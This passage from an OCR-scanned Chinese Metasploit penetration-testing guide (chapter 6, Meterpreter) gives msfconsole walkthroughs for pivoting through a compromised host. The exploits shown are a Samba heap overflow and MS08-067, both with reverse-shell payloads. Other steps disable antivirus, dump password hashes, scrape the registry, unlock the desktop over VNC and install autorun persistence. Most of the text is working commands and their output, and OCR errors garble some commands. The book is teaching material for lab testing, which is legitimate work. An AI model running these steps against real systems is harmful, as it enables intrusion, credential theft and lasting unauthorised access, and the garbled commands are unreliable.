192.168.33.0
255.255.255.0
Session1
89
---
## Page 117
Metasploit渗透测试指南
我们首先通过runget_local_subnets命令，在Meterpreter会话中展示受控系统上本地子网
①。成功地入侵了WindowsXP机并拥有完全的访问权限，然后我们将攻击会话放到后台运行·，
在MSF终端中执行添加路由命令③，告知系统将远程网络ID（即受控主机的本地网络）通过
攻击会话1来进行路由，然后通过routeprint命令显示当前活跃的路由设置·。可以看到正如
预期的那样添加了路由6。
然后我们对目标Linux系统进行第二次渗透攻击，这里使用的是基于Samba的堆溢出漏洞
攻击，这个漏洞存在于我们的Metasploitable靶机上。
use msf exploit(handler) > use linux/samba/lsa_transnames_heap
msf exploit(lsa_transnames_heap)> set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf exploit(1sa_transnames_heap)>set LH0sT 10.10.1.129 0
LHOST => 10.10.1.129
msf exploit(lsa_transnames_heap)>set LPoRT 8080
LPORT=>8080
msf exploit(1sa_transnames_heap)>set RH0ST 192.168.33.132@
RHOST=> 192.168.33.132
msf exploit(lsa_transnames_heap)>ifconfig ③
[*]exec:ifconfig
etho
Link encap:Ethernet HWaddr 00:0c:29:47:e6:79
inet addr:10.10.1.129 Bcast:10.10.1.255 Mask:255.255.255.0
inet6 addr: fe80::20c:29ff:fe47:e679/64 Scope:Link
UP BROADCAST RUNNING MULTICASTMTU:15OOMetriC:1
RX packets:23656errors:0 dropped:0overruns:0frame:0
TX packets:32321 errors:0 dropped:0 overruns:0 carrier
collisions:0 txqueuelen:1000
Interrupt:19Baseaddress:0x2000
10
Link encap:Local Loopback
inet addr:127.0.0.1 Mask:255.0.0.0
inet6addr:::1/128 Scope:Host
UP L0OPBACK RUNNING MTU:16436MetriC:1
RX packets:6o0 errors:0 dropped:0 overruns:0 frame:0
TX packets:6o0 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:41386(41.3 KB）TX bytes:41386(41.3KB)
msfexploit(lsa_transnames_heap)>exploit
[*]Started reverse handler on 10.10.1.129:8080
[*]Creating nop sled....
[*] Trying to exploit Samba with address 0xffffe410...
[*] Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[√lsarpc]...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\1sarpc] ...
[*]Calling the vulnerable function...
06
---
## Page 118
第6章Meterpreter
[+] Server did not respond, this is expected
[*] Trying to exploit Samba with address Oxffffe411...
[*]Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc]...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\1sarpc] ...
[*]Calling the vulnerablefunction...
[+] Server did not respond, this is expected
[*] Trying to exploit Samba with address Oxffffe412...
[*]Connecting totheSMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.33.132[\1sarpc] ...
[*] Calling the vulnerable function...
[*]Sending stage(36bytes)
[*] Command she1l session 1 opened (10.10.1.129:8080 -> 192.168.33.132:1608) ①
通过ifconfig命令显示网络信息③，再与LHOSTO和RHOST?变量进行对比，可以看到，
LHOST参数指定的是攻击机的IP地址。另外注意到，RHOST参数的IP地址设置成了目标
网络子网中的地址，我们通过已经攻陷的机器建立隧道，来对其进行攻击。这时所有的流量
都会通过这台受控机器与子网中的其他目标进行通信。这种情况下，如果堆溢出成功，将会
得到一个来自192.168.33.132的反弹终端，这个反弹连接也简单地利用了在受控主机上建立
的网络通信渠道。以exploit命令执行漏洞利用，和预期的一样，与我们的目标靶机，而非
WindowsXP建立了控制连接·。现在，如果希望进一步对内网进行跳板扫描，我们可以使
用Metasploit内建的scanner/portscan/tcp扫描模块，该模块能够通过Metasploit来使用已建
立的路由通道。
提示：你也可以使用scanner/portscan/tcp扫描器通过跳板机器，对目标子网进行大范围
的端口扫描。这里我们不再给出细节步骤，而仅仅提示了可以使用这个模块对目标子网进行
跳板的端口扫描。
在先前的例子中，我们在入侵系统后使用routeadd命令为Meterpreter的攻击会话添加路
由，如果要更加自动化地完成这一操作，我们可以选择使用loadauto_add_route命令：
msf exploit(ms08_067_netapi) > load auto_add_route
[*]Successfully loaded plugin: auto_add_route
msf exploit(ms08_067_netapi) > exploit
[*]Started reverse handler on 10.10.1.129:443
[*]Triggeringthevulnerability...
[*]Sending stage(748032 bytes)
[*]AutoAddRoute:Routing new subnet 192.168.33.0/255.255.255.0 through session 1
91
---
## Page 119
Metasploit渗透测试指南
6.8使用Meterpreter脚本
Meterpreter的扩展脚本可以在Meterpreter终端里帮助你进行系统查点，或完成事先定义好
的任务。这里我们不打算介绍所有的脚本，但是会涉及到少数几个比较重要的。
提示：Meterpreter的扩展脚本目前正在移植到后渗透攻击模块中，我们在本章中将同时
覆盖到扩展脚本和后渗透攻击模块。
通过“run脚本名字”命令，可以在Meterpreter终端中运行扩展脚本。脚本可能会直接运
行，也可能提供如何使用的帮助。
比如你希望在受控系统上运行一个交互式的远程图形化工具，你可以使用VNC协议将受
控系统的桌面通信通过隧道方式映射过来，使得你访问到远程的图形化桌面。但在某些情况下，
受控系统可能是被锁定的，而你无法访问到桌面，但无须担忧：Metasploit能够帮我们搞定一切。
在下面的例子中，我们运行runvnc 命令，在远程系统上安装VNC会话。然后可以运行
screen_unlock命令对目标机器上的桌面进行解锁。这样就能看到目标主机桌面的VNC窗口。
meterpreter>run vnc
[*]Running payload handler
[*]vNC stager executable37888bytes long
[*]Uploaded the VNCagent to C:\WINDOWS\TEMP\CTDWtQC.exe(must be deleted manually)
[*] Executing the VNC agent with endpoint 192.168.33.129:4545...
[*] VNC Server session 2 opened (192.168.33.129:4545 -> 192.168.33.130:1091)
这里将会得到目标主机的VNC图形界面接口，允许直接操作远程桌面。
meterpreter>run screen_unlock
11 u u Pu .'(7 d a o P) d 1m. S [*]
[*]patching...
jauop[*]
6.8.1迁移进程
当我们攻击系统时，常常是对诸如InternetExplorer之类的服务进行漏洞利用的，如果目标
主机关闭了浏览器，Meterpreter会话也将随之被关闭，从而导致与目标系统的连接丢失。为了
避免这个问题，我们可以使用迁移进程的后渗透攻击模块，将Meterpreter会话迁移到内存空间
中的其它稳定的、不会被关闭的服务进程中，以维持稳定的系统控制连接。
[*]Running module againstV-MAC-XP
[*] Current server process:revterp.exe (2436)
92
---
## Page 120
第6章Meterpreter
[*]Migrating to explorer.exe...
[*] Migrating into process ID 816
[*] New server process:Explorer.EXE (816)
6.8.2关闭杀毒软件
杀毒软件可以阻正某些攻击。在渗透测试过程中，智能杀毒软件和主机入侵防御产品会阻
止我们运行某些攻击，在这种情况下，我们可以运行killav扩展脚本来停止相关进程。
meterpreter>runkillav
[*]Killing Antivirus serviceson thetarget...
[*] Killing off cmd.exe...
[*]Killing off cmd.exe...
6.8.3获取系统密码哈希值
获取系统密码哈希值的副本可以帮助我们实施哈希值传递攻击，或是进行哈希值暴力破解
还原明文密码。可以通过runhashdump命令获得密码哈希值：
meterpreter>runhashdump
[*]Obtaining the boot key...
[*]CalculatingthehbootkeyusingSYSKEYde4b35306c5f595438a2f78f768772d2..
[*] Obtaining the user list and keys...
[*]  Decrypting user keys...
[*]Dumping password hashes...
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
6.8.4查看目标机上的所有流量
想要查看到目标系统上的所有网络流量，可以运行数据包记录脚本。所有被捕获的包都
以.pcap的文件格式存储下来，并能够被Wireshark等工具解析。下面我们以-i1的参数运行数
据包记录脚本，以指定记录数据包的网卡。
[*]StartingPacketcaptureoninterface1
[*]Packet capture started
6.8.5取系统信息
Scraper脚本可以列举出你想从系统得到的任何信息，可以搜取用户名和密码、下载全部
注册表、挖掘密码哈希值、收集系统信息以及输出HKEY_CURRENT_USER（HKCU)。
93
---
## Page 121
Metasploit渗透测试指南
meterpreter>run scraper
[*] New session on 192.168.33.130:1095..
[*]Gathering basic system information...
[*] Dumping password hashes...
[*]obtaining the entire registry...
[*] Exporting HKCU
[*]DownloadingHKCU（C:\WINDOWS\TEMP\XklepHOU.reg）
6.8.6控制持久化
还能运行。如果是反弹连接方式，可以设置连接攻击机的时间间隔。如果是绑定方式，可以设
置在指定时间绑定开放端口。
警告：如果要使用这个功能，请确保完成之后进行移除。如果忘了做的话，任何攻击者
都可以无须认证，获取到这个系统的访问权。
如下所示，我们运行persistence脚本让系统开机自启动Meterpreter（-X），50秒（-i50）
重连一次，使用的端口为443（-p443），连接的目的IP为192.168.33.129。然后用usemulti/handler
命令进行监听O，在设置了一大堆参数之后执行exploit命令，可以看到和预期的一样建立了连
接③。
[*] Creating a persistent agent: LHOST=192.168.33.129 LPORT=443 (interval=50 onboot=true)
[*]Persistent agent script is 316384 bytes long
[*]Uploadedthepersistentagent toC:\WINDOwS\TEMP\asSnqrlUDRwO.vbs
[*]Agentexecuted withPID3160
[*]InstallingintoautorunasHKLM\Software\Microsoft\Windows\CurrentVersion\Run\xEYnaHedooc
[*]Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\
xEYnaHedooc
msf>use multi/handler 0
msf exploit(handler)>set payload windows/meterpreter/reverse_tcp
payload=>windows/meterpreter/reverse_tcp
msf exploit(handler)>set LPoRT 443
LPORT => 443
msf exploit(handler)>setLH0ST 192.168.33.129
LHOST => 192.168.33.129
msf exploit(handler)>exploit
[*] Started reverse handler on 192.168.33.129:443
[*] Starting the payload handler...
[*] Sending stage (748032 bytes)
[*]Meterpreter session 2opened(192.168.33.129:443->192.168.33.130:1120)③
94
---
## Page 122
第6章Meterpreter
在撰写本书时，移除Meterpreter代理的唯-办法是删除HKLM\Software\Microsoft\Windows\
CurrentVersion\Run\中的注册表键和C:WINDOWS\TEMP\中的VBScript文件，手工删除并记录
注册表健值（例如HKLM\Software\Microsoft\Windows\CurrentVersion\Run\xEYnaHedooc?）。一
般可以通过Meterpreter或到shell里面进行删除。如果你觉得用GUI更方便的话，可以使用run
vnc命令远程桌面操作注册表进行删除。（请注意注册表中的键每次都会改变，所以要在
Metasploit添加注册表键的时候做好记录。）
6.9向后渗透攻击模块转变
像先前提到的那样，Meterpreter扩展脚本正在被慢慢转换为后渗透攻击模块，最终将和
Metasploit模块使用统-的标准和格式。后面的章节可以看到辅助模块和漏洞攻击模块的完整结
构。Meterpreter脚本以前使用自已的格式，和其他模块的区别很大。
模块间统一格式的好处之一是可以在所有会话间实施相同的攻击。设想一下，比方说，你
编写定制的脚本。而现在，如果有需要的话，你可以和所有的会话进行交互，同时运行hashdump
命令等。
下面的代码展示了如何使用后渗透攻击模块的例子：
[*]Obtainingthebootkey..
[*]CalculatingthehbootkeyusingSYSKEYde4b35306c5f595438a2f78f768772d2..
[*]Obtaining the userlist and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
如果想列举所有的后渗透攻击模块，可以这样输入然后在末尾按TAB键：
meterpreter>runpost/
6.10将命令行Shell升级为Meterpreter
shell升级为Meterpreter。如果我们开始的时候使用命令行shell进入某系统，后来发现这台机器
是进一步攻击整个网络的完美跳板，这时将控制会话升级为Meterpreter就会显得非常有用。下
95
---
## Page 123
Metasploit渗透测试指南
面的例子是使用MS08-067，以反弹命令行shel1作为payload，然后将其升级为Meterpretershell
的全部过程。
root@bt:/opt/framework3/msf3#msfconsole
msf>search mso8_067
[*]Searchingloaded modules for pattern‘ms08_067'..
Exploits
Name
Rank
Description
windows/smb/mso8_o67_netapi great Microsoft Server Service Relative Path Stack
Corruption
msf>use windows/smb/ms08_o67_netapi
msf exploit(ms08_067_netapi) > set PAYLoAD windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit（ms08_067_netapi)>setTARGET3
target => 3
msf exploit(ms08_067_netapi)>setgLH0ST 192.168.33.129 0
LHOST => 192.168.33.129
msfexploit(ms08_067_netapi)>setgLPoRT8080
LPORT =>8080
msf exploit(ms08_067_netapi)>exploit-z@
[*] Started reverse handler on 192.168.33.129:8080
[*] Triggering the vulnerability...
[*] Sending stage (240 bytes)
[*] Command shel1 session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1032)
[*] Session 1 created in the background.
msf exploit(ms08_067_netapi)>sessions -u1 ③